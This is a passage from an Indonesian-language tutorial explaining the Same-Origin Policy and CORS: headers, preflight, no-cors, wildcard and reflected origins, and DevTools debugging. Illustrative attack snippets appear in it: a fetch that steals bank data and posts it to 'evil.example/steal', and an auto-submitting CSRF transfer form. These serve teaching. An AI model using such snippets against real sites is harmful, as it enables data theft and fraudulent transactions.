# learn-http-for-web-frontend-perspective-part-010

# CORS Part 1: Same-Origin Policy and Why CORS Exists

> Seri: `learn-http-for-web-frontend-perspective`  
> Bagian: `010`  
> Perspektif: frontend/browser dengan latar belakang Java/backend engineer  
> Status seri: belum selesai  
> Bagian sebelumnya: `Part 009 — XMLHttpRequest, Forms, Navigation, Beacon, and Non-Fetch Requests`  
> Bagian berikutnya: `Part 011 — CORS Part 2: Preflight, Credentials, Cookies, and Real Production Bugs`

---

## 0. Tujuan Bagian Ini

Bagian ini membahas **CORS dari akar mental model**, bukan hanya “tambahkan header ini agar error hilang”.

Setelah bagian ini, Anda harus bisa menjawab dengan presisi:

1. apa itu **Same-Origin Policy**;
2. kenapa browser butuh CORS;
3. apa yang sebenarnya dilindungi oleh CORS;
4. kenapa CORS hanya relevan di browser, bukan di server-to-server call;
5. apa bedanya request cross-origin yang boleh dikirim, response yang boleh dibaca, dan request yang harus preflight;
6. kenapa Postman/cURL bisa sukses tapi browser gagal;
7. kenapa `no-cors` hampir tidak pernah menjadi solusi;
8. kenapa CORS bukan authentication, authorization, firewall, atau CSRF protection;
9. bagaimana membaca CORS error secara sistematis dari DevTools;
10. bagaimana membuat keputusan awal konfigurasi CORS yang defensible.

Kita akan sengaja memisahkan:

- **Part 010**: model dasar, Same-Origin Policy, konsep CORS, simple request, preflight overview, header dasar, debugging awal.
- **Part 011**: kasus produksi yang lebih sulit: credentials, cookies, preflight 401, wildcard origin, Spring/Security ordering, CDN + `Vary: Origin`, exposed headers, dan real incident patterns.

---

## 1. Inti Mental Model

CORS adalah **mekanisme browser** yang memakai HTTP headers agar server bisa menyatakan:

> “Origin tertentu boleh membaca response dari resource ini melalui browser.”

Kalimat itu perlu dibaca sangat hati-hati.

CORS bukan berarti:

> “Origin tertentu boleh mengirim request.”

Dalam banyak kasus, browser **tetap mengirim request** ke server cross-origin. Yang dibatasi adalah apakah JavaScript dari origin pemanggil boleh **mengakses response**.

Model yang benar:

```text
JavaScript app di https://app.example.com
        |
        | fetch("https://api.example.com/me")
        v
Browser mengevaluasi policy
        |
        | request mungkin dikirim
        v
Server API menerima request
        |
        | response dikembalikan
        v
Browser mengevaluasi CORS response headers
        |
        +-- jika policy cocok: JS boleh membaca response
        |
        +-- jika policy tidak cocok: JS menerima CORS error / network-like failure
```

Server mungkin sudah mengirim response valid. Network tab mungkin memperlihatkan status `200`. Tapi JavaScript tetap tidak boleh membaca body/headers jika CORS check gagal.

Ini sumber kebingungan paling umum.

---

## 2. Apa Itu Origin?

Origin adalah kombinasi dari:

```text
scheme + host + port
```

Contoh:

```text
https://app.example.com
```

Origin-nya:

```text
scheme: https
host  : app.example.com
port  : 443 implisit
```

Dua URL disebut same-origin hanya jika ketiganya sama.

| URL A | URL B | Same-origin? | Alasan |
|---|---:|---:|---|
| `https://example.com/a` | `https://example.com/b` | Ya | scheme, host, port sama |
| `https://example.com` | `http://example.com` | Tidak | scheme beda |
| `https://example.com` | `https://api.example.com` | Tidak | host beda |
| `https://example.com` | `https://example.com:8443` | Tidak | port beda |
| `http://localhost:3000` | `http://localhost:8080` | Tidak | port beda |
| `http://localhost:3000` | `http://127.0.0.1:3000` | Tidak | host literal beda |

Ini sudah dibahas di Part 002, tetapi di CORS konteksnya menjadi sangat penting.

CORS selalu bertanya:

```text
Origin pemanggil apa?
Resource target origin apa?
Apakah response server mengizinkan origin pemanggil membaca response?
```

---

## 3. Same-Origin Policy: Masalah yang Ingin Diselesaikan

Bayangkan user login ke internet banking:

```text
https://bank.example.com
```

Browser menyimpan session cookie untuk bank tersebut.

Lalu user membuka situs jahat:

```text
https://evil.example
```

Tanpa Same-Origin Policy, JavaScript dari `evil.example` dapat melakukan:

```js
const res = await fetch("https://bank.example.com/account");
const data = await res.json();
await fetch("https://evil.example/steal", {
  method: "POST",
  body: JSON.stringify(data)
});
```

Karena browser mungkin otomatis mengirim cookie bank, situs jahat bisa membaca data rekening user.

Same-Origin Policy dibuat untuk mencegah pola ini.

Prinsip dasarnya:

> Script dari satu origin tidak boleh sembarangan membaca data sensitif dari origin lain.

Namun web juga butuh integrasi lintas origin:

- SPA di `https://app.example.com` butuh API di `https://api.example.com`.
- Dashboard butuh asset dari CDN.
- Payment flow butuh redirect/iframe pihak ketiga.
- Frontend butuh call ke identity provider.
- SaaS app butuh call ke region-specific API.

Maka browser butuh mekanisme controlled relaxation.

Itulah CORS.

---

## 4. Same-Origin Policy Bukan Satu Aturan Tunggal yang Sederhana

Istilah “Same-Origin Policy” sering dipakai seolah-olah satu aturan universal. Dalam praktik browser, SOP adalah keluarga pembatasan yang berbeda-beda untuk konteks berbeda.

Contoh:

| Aktivitas | Cross-origin boleh? | Catatan |
|---|---:|---|
| Menampilkan image dari origin lain | Biasanya boleh | Tetapi canvas bisa menjadi tainted |
| Memuat script dari origin lain | Biasanya boleh | Script berjalan dengan privilege halaman pemuat |
| Membaca response API via `fetch()` | Dibatasi CORS | Fokus bagian ini |
| Submit HTML form ke origin lain | Boleh | Membaca response via JS tetap dibatasi |
| Embed iframe cross-origin | Boleh dengan batasan | DOM access dibatasi |
| Membaca iframe DOM cross-origin | Tidak | SOP DOM restriction |
| Membaca CSS cross-origin | Ada aturan dan MIME/CORS tertentu | Tergantung resource |
| Membaca font cross-origin | Biasanya butuh CORS | Font loading punya aturan khusus |
| WebSocket cross-origin | Model berbeda dari CORS klasik | Origin tetap relevan |

Untuk frontend engineer, kesalahan umum adalah menyimpulkan:

> “Kalau image bisa cross-origin, berarti API juga harus bisa.”

Tidak begitu.

Browser memperlakukan jenis resource berbeda dengan policy berbeda.

---

## 5. CORS: Controlled Relaxation terhadap Same-Origin Policy

CORS adalah protokol berbasis HTTP headers.

Tujuannya bukan untuk menghentikan semua request cross-origin. Tujuannya adalah memberi server cara untuk berkata:

```text
Saya mengizinkan origin X membaca response ini.
```

Contoh response:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://app.example.com

{
  "id": "u_123",
  "name": "Ayu"
}
```

Jika JavaScript dari `https://app.example.com` melakukan request ke API tersebut, browser akan melihat:

```text
Origin pemanggil: https://app.example.com
ACAO response : https://app.example.com
```

Cocok. Maka JavaScript boleh membaca response.

Jika response-nya:

```http
Access-Control-Allow-Origin: https://admin.example.com
```

Browser akan menolak JavaScript dari `https://app.example.com` untuk membaca response.

Server mungkin sudah sukses. Response mungkin sudah sampai. Tapi browser memblokir akses JavaScript.

---

## 6. CORS Bekerja di Browser, Bukan di Server-to-Server Call

CORS adalah browser-enforced policy.

Artinya:

- `fetch()` dari browser terkena CORS.
- `XMLHttpRequest` dari browser terkena CORS.
- browser resource loading tertentu bisa punya CORS mode.
- server Java memanggil API lain via `HttpClient`, `WebClient`, `RestTemplate`, OkHttp, Feign, atau cURL **tidak terkena CORS**.
- Postman tidak terkena CORS.
- cURL tidak terkena CORS.
- backend job tidak terkena CORS.

Maka pernyataan ini salah:

> “API-nya aman karena CORS hanya allow origin internal.”

CORS tidak mencegah attacker membuat server sendiri lalu memanggil API Anda.

Jika API butuh proteksi, gunakan:

- authentication;
- authorization;
- session validation;
- token validation;
- CSRF mitigation untuk cookie-based session;
- rate limiting;
- network boundary jika relevan;
- input validation;
- audit logging.

CORS hanya mengontrol apakah browser memberikan response cross-origin kepada JavaScript pemanggil.

---

## 7. Kenapa Postman Sukses Tapi Browser Gagal?

Karena Postman bukan browser.

Postman tidak menjalankan Same-Origin Policy. Postman tidak membuat preflight seperti browser. Postman tidak memblokir JavaScript dari membaca response, karena tidak ada JavaScript page origin.

Jika API berhasil di Postman tetapi gagal di browser, kemungkinan masalahnya ada di salah satu layer ini:

```text
Browser origin policy
CORS response headers
preflight handling
credentials/cookie policy
redirect handling
mixed content
TLS/certificate/browser trust
service worker/cache interference
```

Bukan otomatis berarti API business logic rusak.

Cara berpikirnya:

```text
Postman test membuktikan server endpoint bisa merespons request tertentu.
Browser test membuktikan server endpoint bisa digunakan oleh halaman web tertentu dalam policy browser tertentu.
```

Keduanya bukan test yang sama.

---

## 8. CORS Error Sering Menyembunyikan Response Asli

Browser sering menampilkan error seperti:

```text
Access to fetch at 'https://api.example.com/me' from origin 'https://app.example.com'
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present
on the requested resource.
```

Dari perspektif JavaScript, ini sering terlihat seperti “network error”.

Contoh:

```js
try {
  const res = await fetch("https://api.example.com/me");
  console.log(res.status);
} catch (err) {
  console.error("Fetch failed", err);
}
```

Jika CORS check gagal, Anda mungkin tidak mendapatkan `res.status`, meskipun server sebenarnya mengirim `401`, `403`, `500`, atau bahkan `200`.

Browser sengaja membatasi detail agar cross-origin attacker tidak dapat memakai error detail sebagai side channel.

Untuk debugging, Anda harus melihat:

- Console error;
- Network tab;
- request headers;
- response headers;
- apakah ada preflight `OPTIONS`;
- status preflight;
- status actual request;
- apakah response punya `Access-Control-Allow-Origin`;
- apakah redirect terjadi;
- apakah request pakai credentials.

---

## 9. Three Questions Model

Untuk setiap CORS issue, tanya tiga hal:

```text
1. Apakah request cross-origin?
2. Apakah request butuh preflight?
3. Apakah response CORS headers cocok dengan request?
```

Jika ada credentials/cookies, tambah pertanyaan keempat:

```text
4. Apakah credentialed CORS dikonfigurasi dengan benar?
```

Part 010 fokus ke tiga pertanyaan pertama. Pertanyaan keempat akan didalami di Part 011.

---

## 10. Apa Itu `Origin` Header?

Ketika browser melakukan CORS request, browser mengirim header:

```http
Origin: https://app.example.com
```

`Origin` memberitahu server dari origin mana request itu berasal.

Contoh request:

```http
GET /me HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Accept: application/json
```

Server kemudian bisa memutuskan:

```text
Apakah https://app.example.com boleh membaca response resource ini?
```

Jika ya:

```http
Access-Control-Allow-Origin: https://app.example.com
```

Jika tidak, server bisa:

- tidak mengirim CORS header;
- mengirim status error;
- mengirim CORS header untuk origin lain;
- reject request lebih awal.

Namun yang menentukan apakah JavaScript bisa membaca response adalah browser.

---

## 11. Header Paling Dasar: `Access-Control-Allow-Origin`

Header paling penting dalam CORS adalah:

```http
Access-Control-Allow-Origin: <origin>
```

Contoh:

```http
Access-Control-Allow-Origin: https://app.example.com
```

Atau untuk public non-credentialed resource:

```http
Access-Control-Allow-Origin: *
```

Maknanya:

```text
Response ini boleh dibagikan oleh browser ke JavaScript dari origin tersebut.
```

Perhatikan: header ini ada di **response**, bukan request.

Frontend tidak bisa memperbaiki CORS dengan menambahkan `Access-Control-Allow-Origin` di request.

Ini salah:

```js
fetch("https://api.example.com/me", {
  headers: {
    "Access-Control-Allow-Origin": "*"
  }
});
```

Header itu harus dikirim oleh server, gateway, CDN, atau reverse proxy sebagai response header.

---

## 12. Simple Request: Nama yang Menipu

Browser tidak selalu membuat preflight. Beberapa request cross-origin disebut “simple request” secara historis.

Secara konseptual, simple request adalah request yang mirip dengan kemampuan HTML form tradisional, sehingga server web lama diasumsikan sudah harus siap menghadapi request seperti itu.

Request sederhana biasanya memenuhi batasan seperti:

- method hanya `GET`, `HEAD`, atau `POST`;
- hanya memakai CORS-safelisted request headers tertentu;
- jika ada `Content-Type`, nilainya terbatas ke tipe tertentu seperti:
  - `application/x-www-form-urlencoded`
  - `multipart/form-data`
  - `text/plain`

Contoh simple-ish CORS request:

```js
await fetch("https://api.example.com/public-products");
```

Browser dapat langsung mengirim:

```http
GET /public-products HTTP/1.1
Host: api.example.com
Origin: https://shop.example.com
Accept: */*
```

Server harus mengembalikan:

```http
Access-Control-Allow-Origin: https://shop.example.com
```

agar JavaScript boleh membaca response.

Poin penting:

> Simple request bukan berarti bebas dari CORS. Simple request hanya berarti tidak perlu preflight.

CORS check tetap terjadi pada response.

---

## 13. Non-Simple Request dan Preflight

Jika request dianggap berpotensi lebih “kuat” atau tidak seperti form tradisional, browser melakukan **preflight**.

Preflight adalah request `OPTIONS` otomatis dari browser untuk bertanya:

> “Server, apakah origin ini boleh mengirim actual request dengan method/header tertentu?”

Contoh JavaScript:

```js
await fetch("https://api.example.com/orders/123", {
  method: "PUT",
  headers: {
    "Content-Type": "application/json",
    "X-Request-ID": "abc-123"
  },
  body: JSON.stringify({ status: "CANCELLED" })
});
```

Karena method `PUT`, content type JSON, dan custom header, browser membuat preflight:

```http
OPTIONS /orders/123 HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type,x-request-id
```

Server harus menjawab kira-kira:

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: PUT
Access-Control-Allow-Headers: content-type,x-request-id
Access-Control-Max-Age: 600
```

Jika preflight lolos, browser mengirim actual request:

```http
PUT /orders/123 HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Content-Type: application/json
X-Request-ID: abc-123

{"status":"CANCELLED"}
```

Server actual response juga tetap perlu CORS header yang sesuai:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://app.example.com

{"id":"123","status":"CANCELLED"}
```

---

## 14. Preflight Adalah Permission Check, Bukan Business Request

Preflight tidak boleh diperlakukan seperti request domain.

Preflight:

- method-nya `OPTIONS`;
- dikirim otomatis oleh browser;
- tidak dikirim oleh kode aplikasi secara eksplisit;
- tidak membawa body domain;
- tidak seharusnya membuat side effect;
- tidak seharusnya menjalankan business validation;
- tidak seharusnya membutuhkan CSRF token;
- umumnya tidak membawa credentials menurut model Fetch;
- hanya bertanya apakah actual request boleh dilanjutkan.

Kesalahan backend yang umum:

```text
Security filter menolak OPTIONS karena tidak ada Authorization header.
```

Akibatnya:

```text
Browser tidak pernah mengirim actual request.
Frontend melihat CORS error.
Backend developer melihat tidak ada request PUT/POST utama.
Semua orang bingung.
```

Solusi konseptual:

```text
CORS/preflight harus diproses sebelum auth/business filter yang mengharuskan credential actual request.
```

Detail produksi dibahas di Part 011.

---

## 15. Kapan Preflight Terjadi?

Secara praktis, preflight sering terjadi ketika request memakai:

1. method selain `GET`, `HEAD`, `POST`;
2. `Content-Type: application/json` untuk cross-origin `POST`;
3. custom headers seperti:
   - `Authorization`
   - `X-Request-ID`
   - `X-CSRF-Token`
   - `X-Tenant-ID`
   - `X-Client-Version`
4. upload/progress scenario tertentu;
5. request mode/headers yang tidak masuk CORS-safelisted set.

Contoh yang memicu preflight:

```js
fetch("https://api.example.com/orders", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({ itemId: "sku_1" })
});
```

Banyak engineer terkejut karena `POST` dianggap simple, tetapi `Content-Type: application/json` membuatnya tidak simple.

Contoh lain:

```js
fetch("https://api.example.com/me", {
  headers: {
    Authorization: "Bearer abc"
  }
});
```

Walaupun method-nya `GET`, header `Authorization` membuat preflight.

---

## 16. Preflight Bukan Hal Buruk

Preflight sering dianggap “gangguan” karena menambah satu round trip. Tapi dari sudut browser security, preflight adalah mekanisme safety.

Preflight memberi server kesempatan untuk berkata:

```text
Saya sadar origin X ingin mengirim method Y dengan headers Z.
Saya mengizinkannya.
```

Tanpa preflight, halaman jahat dapat lebih mudah mengirim request kompleks ke server yang tidak pernah didesain untuk cross-origin interaction.

Namun di sistem produksi, preflight perlu dikelola:

- cache dengan `Access-Control-Max-Age` jika aman;
- hindari custom header yang tidak perlu;
- konsolidasikan API origin jika feasible;
- pastikan gateway menangani OPTIONS cepat;
- pastikan observability memisahkan preflight dan actual request;
- jangan memaksa preflight melewati business auth yang salah layer.

---

## 17. CORS Request Flow: Simple Request

Flow simple request:

```text
1. JS dari https://app.example.com memanggil https://api.example.com/products
2. Browser melihat target cross-origin
3. Browser mengirim GET dengan Origin header
4. Server mengembalikan response + Access-Control-Allow-Origin
5. Browser membandingkan Origin dengan ACAO
6. Jika cocok, JS boleh membaca response
7. Jika tidak cocok, JS menerima CORS failure
```

Diagram:

```text
Browser / JS                  API Server
     |                            |
     | GET /products              |
     | Origin: https://app...     |
     |--------------------------->|
     |                            |
     | 200 OK                     |
     | ACAO: https://app...       |
     |<---------------------------|
     |                            |
     | JS can read response       |
```

Jika header tidak ada:

```text
Browser / JS                  API Server
     |                            |
     | GET /products              |
     | Origin: https://app...     |
     |--------------------------->|
     |                            |
     | 200 OK                     |
     | no ACAO                    |
     |<---------------------------|
     |                            |
     | JS blocked by browser      |
```

---

## 18. CORS Request Flow: Preflighted Request

Flow preflighted request:

```text
1. JS ingin mengirim PUT dengan JSON dan custom header
2. Browser mendeteksi request tidak simple
3. Browser mengirim OPTIONS preflight
4. Server menjawab allowed origin/method/headers
5. Browser mengevaluasi preflight response
6. Jika lolos, browser mengirim actual request
7. Server mengirim actual response
8. Browser mengevaluasi actual response CORS headers
9. Jika cocok, JS boleh membaca response
```

Diagram:

```text
Browser / JS                  API Server
     |                            |
     | OPTIONS /orders/123        |
     | Origin: https://app...     |
     | ACR-Method: PUT            |
     | ACR-Headers: content-type  |
     |--------------------------->|
     |                            |
     | 204 No Content             |
     | ACAO: https://app...       |
     | ACAM: PUT                  |
     | ACAH: content-type         |
     |<---------------------------|
     |                            |
     | PUT /orders/123            |
     | Origin: https://app...     |
     | Content-Type: application/json
     |--------------------------->|
     |                            |
     | 200 OK                     |
     | ACAO: https://app...       |
     |<---------------------------|
     |                            |
     | JS can read response       |
```

Jika preflight gagal, actual request tidak dikirim.

---

## 19. Header `Access-Control-Allow-Methods`

Pada preflight response, server menyatakan method yang diizinkan:

```http
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
```

Jika browser bertanya:

```http
Access-Control-Request-Method: PATCH
```

Tetapi response hanya:

```http
Access-Control-Allow-Methods: GET, POST
```

Maka browser tidak akan mengirim actual `PATCH`.

Catatan penting:

- Header ini relevan untuk preflight.
- Ini bukan pengganti routing atau authorization server.
- Server tetap harus memvalidasi method actual request.
- Jangan menganggap karena method ada di CORS allow list berarti user berhak melakukan operasi itu.

CORS allow list menjawab:

```text
Apakah browser boleh mencoba actual request dari origin ini?
```

Authorization menjawab:

```text
Apakah principal/user ini berhak menjalankan aksi ini?
```

Dua pertanyaan berbeda.

---

## 20. Header `Access-Control-Allow-Headers`

Pada preflight response, server menyatakan request headers yang diizinkan:

```http
Access-Control-Allow-Headers: content-type, authorization, x-request-id
```

Browser membandingkannya dengan:

```http
Access-Control-Request-Headers: content-type,authorization,x-request-id
```

Jika frontend mengirim header baru:

```js
headers: {
  "X-Client-Version": "1.2.3"
}
```

maka browser akan bertanya:

```http
Access-Control-Request-Headers: x-client-version
```

Jika server belum mengizinkan header itu, request gagal sebelum actual request dikirim.

Ini sering terjadi saat frontend menambahkan observability header, tenant header, feature flag header, atau CSRF header.

Checklist saat menambah custom request header:

```text
1. Apakah header ini benar-benar perlu?
2. Apakah header ini memicu preflight?
3. Apakah gateway/server allow header ini?
4. Apakah header ini aman dari PII leakage?
5. Apakah header ini mempengaruhi cache key atau CDN behavior?
6. Apakah header ini konsisten di semua environment?
```

---

## 21. Header `Access-Control-Max-Age`

Preflight bisa di-cache oleh browser.

Server dapat mengirim:

```http
Access-Control-Max-Age: 600
```

Artinya browser dapat menyimpan hasil preflight selama periode tertentu, sehingga request berikutnya dengan kombinasi origin/method/headers yang sama tidak perlu preflight ulang selama cache masih valid.

Manfaat:

- mengurangi latency;
- mengurangi beban OPTIONS di gateway;
- mengurangi noise log.

Risiko:

- perubahan CORS policy tidak langsung terasa pada browser yang sudah cache preflight;
- debugging bisa membingungkan;
- browser dapat membatasi max-age efektif;
- konfigurasi berbeda antar environment bisa tampak inconsistent.

Untuk development, kadang lebih mudah memakai max-age kecil. Untuk production, max-age moderat bisa membantu performance, tetapi tetap harus disesuaikan dengan policy change risk.

---

## 22. Header `Access-Control-Expose-Headers`

Secara default, JavaScript tidak bisa membaca semua response headers cross-origin.

Misalnya server mengirim:

```http
X-Request-ID: req_123
X-Total-Count: 218
```

Network tab bisa memperlihatkan headers itu, tetapi JavaScript mungkin tidak bisa membaca:

```js
const total = response.headers.get("X-Total-Count");
```

Agar bisa dibaca, server perlu:

```http
Access-Control-Expose-Headers: X-Request-ID, X-Total-Count
```

Ini sangat penting untuk:

- pagination metadata;
- rate limit metadata;
- correlation ID;
- trace ID;
- download filename via `Content-Disposition`;
- API version/deprecation metadata.

Namun jangan expose header sensitif sembarangan.

Prinsipnya:

```text
CORS tidak hanya mengatur apakah body bisa dibaca.
CORS juga mengatur response headers mana yang bisa dibaca JS.
```

---

## 23. CORS dan Credentials: Preview Saja

Credentials dalam konteks CORS meliputi hal seperti:

- cookies;
- HTTP authentication;
- TLS client certificates;
- credential mode Fetch.

Credentialed CORS punya aturan lebih ketat.

Contoh fetch:

```js
await fetch("https://api.example.com/me", {
  credentials: "include"
});
```

Untuk request seperti ini, server biasanya perlu:

```http
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

Dan tidak boleh sekadar:

```http
Access-Control-Allow-Origin: *
```

untuk credentialed request.

Detail lengkap dibahas di Part 011 karena ini salah satu sumber bug paling besar di production.

Untuk Part 010 cukup pegang invariant:

```text
Non-credentialed public CORS relatif sederhana.
Credentialed CORS adalah mode yang jauh lebih ketat dan rawan salah konfigurasi.
```

---

## 24. `no-cors`: Hampir Tidak Pernah Solusi

Ketika developer melihat CORS error, sering muncul ide:

```js
fetch("https://api.example.com/data", {
  mode: "no-cors"
});
```

Ini hampir selalu salah.

`no-cors` bukan berarti:

```text
Matikan CORS dan baca response bebas.
```

`no-cors` berarti browser membuat request dengan mode terbatas dan menghasilkan **opaque response**.

Opaque response tidak bisa dibaca secara normal oleh JavaScript:

```js
const res = await fetch(url, { mode: "no-cors" });
console.log(res.type);   // "opaque"
console.log(res.status); // biasanya 0
await res.json();        // tidak memberi data yang Anda butuhkan
```

`no-cors` berguna untuk kasus khusus resource request tertentu, bukan untuk membaca JSON API cross-origin.

Jika target Anda adalah:

```text
Frontend ingin membaca response API cross-origin.
```

maka solusinya adalah konfigurasi CORS server/proxy yang benar, bukan `no-cors`.

---

## 25. CORS Bukan CSRF Protection

CORS dan CSRF sering dicampuradukkan.

CORS melindungi:

```text
Apakah JavaScript origin lain boleh membaca response?
```

CSRF berkaitan dengan:

```text
Apakah situs jahat bisa membuat browser user mengirim request state-changing dengan credential user?
```

Contoh:

```html
<form action="https://bank.example.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000000">
</form>
<script>document.forms[0].submit()</script>
```

Form cross-origin bisa dikirim tanpa CORS seperti fetch JSON API. Jika bank hanya mengandalkan CORS, request state-changing masih bisa sampai.

Maka untuk cookie-based auth, tetap butuh:

- SameSite cookie strategy;
- CSRF token;
- origin/referrer validation jika sesuai;
- idempotency and confirmation controls;
- server-side authorization;
- business-level fraud controls.

CORS tidak cukup.

Kalimat yang harus diingat:

```text
CORS can stop a malicious site from reading a protected response.
CORS is not sufficient to stop a malicious site from causing some requests to be sent.
```

---

## 26. CORS Bukan Authorization

Misalnya server mengizinkan:

```http
Access-Control-Allow-Origin: https://app.example.com
```

Itu bukan berarti semua user dari app tersebut boleh melakukan semua operasi.

CORS hanya mengecek origin halaman web, bukan identitas user.

Authorization tetap harus dilakukan berdasarkan:

- session principal;
- token claims;
- role;
- permission;
- tenant membership;
- object ownership;
- policy decision;
- business rule.

CORS menjawab:

```text
Bolehkah browser dari origin ini membaca response?
```

Authorization menjawab:

```text
Bolehkah actor ini melakukan action ini terhadap resource ini?
```

Jangan pernah mengganti authorization dengan CORS allowlist.

---

## 27. CORS Bukan Firewall

Jika API endpoint bisa diakses publik di internet, attacker bisa memanggilnya dari:

- cURL;
- bot;
- server mereka sendiri;
- Postman;
- script Python;
- headless environment;
- mobile app palsu.

CORS tidak menghentikan itu.

Jika endpoint harus tidak bisa dipanggil dari luar jaringan, gunakan network control:

- private network;
- firewall;
- VPN;
- mTLS;
- API gateway policy;
- auth/token;
- signed requests;
- WAF/rate limit;
- allowlist IP jika sesuai.

CORS adalah browser sharing policy, bukan perimeter security.

---

## 28. `Access-Control-Allow-Origin: *` Kapan Masuk Akal?

Wildcard origin masuk akal untuk public, non-sensitive, non-credentialed resource.

Contoh:

- public catalog;
- static JSON public;
- open API tanpa credential;
- public font/image asset dengan CORS requirement;
- documentation metadata.

Contoh response:

```http
Access-Control-Allow-Origin: *
Cache-Control: public, max-age=300
```

Namun wildcard tidak cocok untuk:

- session-based API;
- user-specific data;
- admin API;
- tenant-specific data;
- API yang memakai cookies;
- API yang butuh `credentials: include`;
- response yang mengandung PII;
- internal operation endpoint.

Untuk private credentialed API, gunakan explicit allowlist origin.

---

## 29. Dynamic Origin Reflection: Berguna Tapi Berbahaya

Banyak server melakukan ini:

```text
Ambil Origin dari request.
Jika ada, pantulkan ke Access-Control-Allow-Origin.
```

Contoh:

```http
Origin: https://evil.example
```

Response:

```http
Access-Control-Allow-Origin: https://evil.example
```

Jika dilakukan tanpa validasi allowlist, ini sama saja dengan mengizinkan semua origin, tetapi terlihat seolah-olah spesifik.

Dynamic reflection hanya aman jika:

```text
Origin request dicek terhadap allowlist yang ketat sebelum dipantulkan.
```

Pseudo-code yang lebih benar:

```java
Set<String> allowedOrigins = Set.of(
    "https://app.example.com",
    "https://admin.example.com"
);

String origin = request.getHeader("Origin");

if (allowedOrigins.contains(origin)) {
    response.setHeader("Access-Control-Allow-Origin", origin);
    response.setHeader("Vary", "Origin");
}
```

Perhatikan `Vary: Origin`. Ini penting saat response melewati cache/CDN. Detailnya akan dibahas lebih dalam di Part 011.

---

## 30. `Vary: Origin`: Preview Penting

Jika response CORS berbeda berdasarkan `Origin`, cache harus diberi tahu.

Contoh:

```http
Access-Control-Allow-Origin: https://app.example.com
Vary: Origin
```

Tanpa `Vary: Origin`, cache/CDN bisa menyimpan response untuk satu origin lalu menyajikannya ke origin lain dengan CORS header yang salah.

Akibatnya bisa:

- origin valid tiba-tiba gagal;
- origin tidak valid mendapat header yang tidak semestinya;
- bug intermittent tergantung cache hit/miss;
- security posture melemah;
- debugging sangat sulit.

Aturan awal:

```text
Jika Access-Control-Allow-Origin dibuat dinamis berdasarkan request Origin, pertimbangkan Vary: Origin sebagai bagian dari kontrak caching.
```

---

## 31. Membaca CORS di DevTools Network

Saat debugging CORS, jangan hanya baca Console. Buka Network tab.

Langkah sistematis:

### 31.1 Cari actual request

Misalnya request:

```text
https://api.example.com/orders
```

Periksa:

- method;
- status;
- request headers;
- response headers;
- apakah ada `Origin`;
- apakah response punya `Access-Control-Allow-Origin`;
- apakah ada redirect.

### 31.2 Cari preflight OPTIONS

Filter method `OPTIONS`.

Jika ada, periksa:

Request headers:

```http
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type,authorization
```

Response headers:

```http
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: content-type,authorization
```

### 31.3 Cocokkan secara mekanis

Pertanyaan:

```text
Origin request sama dengan ACAO response?
Method actual ada di ACAM?
Headers actual yang diminta ada di ACAH?
Jika credentials dipakai, apakah ACAC true dan ACAO bukan wildcard?
Apakah response actual juga punya ACAO?
```

### 31.4 Cek status preflight

Preflight sebaiknya 2xx, sering `204 No Content`.

Jika preflight:

- `301/302`: curiga redirect OPTIONS bermasalah;
- `401`: auth filter terlalu awal;
- `403`: CORS/security config menolak;
- `404`: route OPTIONS tidak ditangani;
- `405`: method OPTIONS tidak diizinkan;
- `500`: server/proxy error;
- no response: network/TLS/DNS/proxy issue.

---

## 32. Common Console Errors dan Artinya

### 32.1 No `Access-Control-Allow-Origin`

```text
No 'Access-Control-Allow-Origin' header is present on the requested resource.
```

Kemungkinan:

- server memang tidak mengirim CORS header;
- request masuk ke error path yang tidak menambahkan CORS header;
- gateway menghapus header;
- redirect ke origin lain tanpa CORS header;
- preflight endpoint tidak dikonfigurasi;
- exception handler tidak menambahkan CORS header.

### 32.2 Origin not allowed

```text
The 'Access-Control-Allow-Origin' header has a value 'https://x'
that is not equal to the supplied origin.
```

Kemungkinan:

- salah environment;
- app URL berubah;
- trailing slash dimasukkan secara keliru dalam origin allowlist;
- port localhost berbeda;
- CDN cache menyajikan CORS header untuk origin lain;
- allowlist tidak sinkron.

Origin tidak punya path. Ini salah:

```text
https://app.example.com/
https://app.example.com/dashboard
```

Origin yang benar:

```text
https://app.example.com
```

### 32.3 Method not allowed by CORS

```text
Method PUT is not allowed by Access-Control-Allow-Methods.
```

Kemungkinan:

- server allow methods belum mencakup `PUT`;
- gateway config berbeda dari app config;
- preflight dijawab oleh service lain;
- method override membuat mismatch.

### 32.4 Header not allowed by CORS

```text
Request header field authorization is not allowed by Access-Control-Allow-Headers.
```

Kemungkinan:

- frontend menambah `Authorization`;
- server tidak allow `authorization`;
- case bukan masalah utama, tetapi normalization bisa membingungkan;
- proxy mengubah/menyaring preflight headers;
- allow headers terlalu sempit.

### 32.5 Wildcard with credentials

```text
The value of the 'Access-Control-Allow-Origin' header in the response
must not be the wildcard '*' when the request's credentials mode is 'include'.
```

Kemungkinan:

- frontend pakai `credentials: "include"`;
- server pakai `Access-Control-Allow-Origin: *`;
- cookie/session flow butuh explicit origin.

Detail lanjut di Part 011.

---

## 33. CORS dan Error Response

Salah satu bug umum:

```text
Success response punya CORS headers.
Error response tidak punya CORS headers.
```

Contoh:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Content-Type: application/json

{"data":...}
```

Tetapi saat error:

```http
HTTP/1.1 500 Internal Server Error
Content-Type: application/json

{"error":"DATABASE_DOWN"}
```

Karena error response tidak punya ACAO, frontend hanya melihat CORS error, bukan 500.

Akibat:

- observability frontend buruk;
- user mendapat pesan generic;
- engineer salah menyangka CORS config rusak;
- root cause backend tertutup.

Prinsip:

```text
